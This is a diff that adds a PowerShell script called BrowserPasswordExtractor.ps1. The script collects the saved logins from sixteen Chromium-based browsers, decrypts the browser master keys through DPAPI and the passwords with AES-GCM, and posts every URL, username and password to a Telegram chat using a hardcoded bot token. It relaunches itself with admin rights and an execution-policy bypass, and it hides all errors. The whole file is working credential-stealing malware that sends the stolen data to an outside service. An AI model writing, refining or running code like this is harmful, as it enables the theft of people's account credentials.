@@ -1,0 +1,192 @@
+<#
+.SYNOPSIS
+    Extracts saved passwords from various browsers and sends them via Telegram.
+.DESCRIPTION
+    This script searches for saved passwords in multiple Chromium-based browsers,
+    decrypts them using the Windows Data Protection API, and sends the results
+    to a specified Telegram chat.
+.NOTES
+    This script requires administrative privileges to access browser data files.
+    File Name: BrowserPasswordExtractor.ps1
+    Author: Anonymous
+    Version: 1.0
+#>
+
+# Telegram Bot settings
+$BOT_TOKEN = "7896528275:AAEWHHIWJrdPFJ2qR5V_OcLleSmQV7mx7Yw"
+$CHAT_ID = "1046292733"
+
+# List of browsers to check
+$browsers = @{
+    'Amigo' = "$env:APPDATA\Amigo\User Data"
+    'Torch' = "$env:APPDATA\Torch\User Data"
+    'Kometa' = "$env:APPDATA\Kometa\User Data"
+    'Orbitum' = "$env:APPDATA\Orbitum\User Data"
+    'CentBrowser' = "$env:APPDATA\CentBrowser\User Data"
+    '7Star' = "$env:APPDATA\7Star\7Star\User Data"
+    'Sputnik' = "$env:APPDATA\Sputnik\Sputnik\User Data"
+    'Vivaldi' = "$env:APPDATA\Vivaldi\User Data"
+    'Chrome SxS' = "$env:APPDATA\Google\Chrome SxS\User Data"
+    'Chrome' = "$env:APPDATA\Google\Chrome\User Data"
+    'Epic Privacy Browser' = "$env:APPDATA\Epic Privacy Browser\User Data"
+    'Microsoft Edge' = "$env:APPDATA\Microsoft\Edge\User Data"
+    'Uran' = "$env:APPDATA\uCozMedia\Uran\User Data"
+    'Yandex' = "$env:APPDATA\Yandex\YandexBrowser\User Data"
+    'Brave' = "$env:APPDATA\BraveSoftware\Brave-Browser\User Data"
+    'Iridium' = "$env:APPDATA\Iridium\User Data"
+}
+
+function Get-MasterKey {
+    param (
+        [string]$localStatePath
+    )
+    
+    try {
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)] # Remove DPAPI prefix
+        
+        # Use Windows Data Protection API to decrypt the master key
+        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedKey,
+            $null,
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        
+        return $decryptedKey
+    }
+    catch {
+        return $null
+    }
+}
+
+function Decrypt-Password {
+    param (
+        [byte[]]$encryptedData,
+        [byte[]]$masterKey
+    )
+    
+    try {
+        $iv = $encryptedData[3..14]
+        $cipherText = $encryptedData[15..($encryptedData.Length-17)] # Last 16 bytes are tag
+        
+        # Create AES-GCM decryptor
+        $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+        $plainText = [byte[]]::new($cipherText.Length)
+        $tag = $encryptedData[($encryptedData.Length-16)..($encryptedData.Length-1)]
+        
+        $aes.Decrypt($iv, $cipherText, $tag, $plainText)
+        
+        return [System.Text.Encoding]::UTF8.GetString($plainText)
+    }
+    catch {
+        return $null
+    }
+}
+
+function Get-BrowserPasswords {
+    $allPasswords = @()
+    
+    foreach ($browser in $browsers.GetEnumerator()) {
+        $name = $browser.Key
+        $path = $browser.Value
+        
+        if (-not (Test-Path $path)) {
+            continue
+        }
+        
+        try {
+            $localStatePath = Join-Path $path "Local State"
+            $loginDataPath = Join-Path $path "Default\Login Data"
+            
+            if (-not (Test-Path $localStatePath) -or -not (Test-Path $loginDataPath)) {
+                continue
+            }
+            
+            # Get master key
+            $masterKey = Get-MasterKey $localStatePath
+            if (-not $masterKey) {
+                continue
+            }
+            
+            # Copy the login database to avoid locking issues
+            $tempDbPath = Join-Path $env:TEMP "Loginvault.db"
+            Copy-Item $loginDataPath -Destination $tempDbPath -Force
+            
+            # Query the database
+            $connectionString = "Data Source=$tempDbPath;"
+            $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+            $connection.Open()
+            
+            $command = $connection.CreateCommand()
+            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+            
+            $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
+            $dataSet = New-Object System.Data.DataSet
+            [void]$adapter.Fill($dataSet)
+            
+            foreach ($row in $dataSet.Tables[0].Rows) {
+                $url = $row[0]
+                $username = $row[1]
+                $encryptedPassword = $row[2]
+                
+                if ($url -and $username -and $encryptedPassword) {
+                    $passwordBytes = [byte[]]$encryptedPassword
+                    $decryptedPassword = Decrypt-Password $passwordBytes $masterKey
+                    
+                    if ($decryptedPassword) {
+                        $entry = "🔑 <b>$name</b>`n🌐 <b>URL:</b> $url`n👤 <b>Username:</b> $username`n🔒 <b>Password:</b> $decryptedPassword`n"
+                        $allPasswords += $entry
+                    }
+                }
+            }
+            
+            $connection.Close()
+            Remove-Item $tempDbPath -Force
+        }
+        catch {
+            # Silently continue on errors
+            continue
+        }
+    }
+    
+    return $allPasswords
+}
+
+function Send-ToTelegram {
+    param (
+        [string]$message
+    )
+    
+    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+    $body = @{
+        chat_id = $CHAT_ID
+        text = $message
+        parse_mode = "HTML"
+        disable_web_page_preview = $true
+    }
+    
+    try {
+        Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 10 | Out-Null
+    }
+    catch {
+        # Silently fail on errors
+    }
+}
+
+# Main execution
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # Relaunch as admin if not already
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$passwords = Get-BrowserPasswords
+if ($passwords) {
+    # Split into chunks to avoid message length limits
+    $chunkSize = 20
+    for ($i = 0; $i -lt $passwords.Count; $i += $chunkSize) {
+        $chunk = $passwords[$i..($i + $chunkSize - 1)] -join "`n`n"
+        Send-ToTelegram $chunk
+    }
+}
